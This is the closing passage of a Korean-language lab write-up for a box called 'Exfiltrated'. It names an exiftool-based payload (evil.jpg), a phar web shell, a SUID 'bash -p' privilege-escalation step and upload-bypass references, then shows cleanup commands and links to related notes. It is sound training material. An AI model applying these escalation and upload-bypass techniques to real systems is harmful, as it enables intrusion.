- Apache PHP 핸들러 매핑 — Ubuntu/Debian 기본값 `<FilesMatch ".+\.ph(ar|p|tml)$">` (`/etc/apache2/mods-enabled/php*.conf`)
- PayloadsAllTheThings — Upload Insecure Files (확장자 우회 목록)
- GTFOBins — `bash`: SUID 항목(`bash -p`)

## 남긴 흔적 (정리 완료)

작업 후 직접 정리했다. `evil.jpg` 를 지우지 않으면 매분 root RCE 가 계속 트리거된다.

```bash
root@exfiltrated:~# rm -f /var/www/html/subrion/uploads/evil.jpg /var/www/html/subrion/uploads/exfsh01.phar
root@exfiltrated:~# chmod 755 /bin/bash
root@exfiltrated:~# ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

남은 것: `/opt/metadata/` 아래 크론이 만든 exiftool 로그 몇 개(부산물), Subrion 관리자 로그인 기록. 설정 변경·데이터 삭제는 없다.

**이 박스에서 정리는 선택이 아니다.** 페이로드를 남기면 매분 root RCE 가 재트리거되니, 시험이라면 다른 응시자와 채점 환경에 영향을 주고 실무라면 고객 환경에 백도어를 남기는 셈이다. 특히 `chmod +s /bin/bash` 는 되돌리기를 잊기 쉬운 변경이다. 권한상승에 SUID 를 썼다면 원래 모드 `755` 로 복구하고 `ls -la` 로 증빙을 남긴다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[01. Pentest Foundations]] — Exfiltrated 항목
- [[Exghost]] — 같은 CVE-2021-22204, 다른 트리거(웹 업로드 즉시 실행)
- [[Astronaut]] — 크론 기반 지연 실행 사례
- [[Muddy]] — 크론 기반 권한상승
- [[Hawat]] — 인용 중첩 회피(hex 리터럴), "응답이 성공을 뜻하지 않는다"
- [[Squid]] — 바이너리 전송 후 해시 대조 습관
- [[Levram]] — 공개 익스플로잇을 읽고 고쳐 쓰기
- [[Crane]] · [[Hub]] · [[RubyDome]] · [[Fanatastic]] — 같은 컬렉션
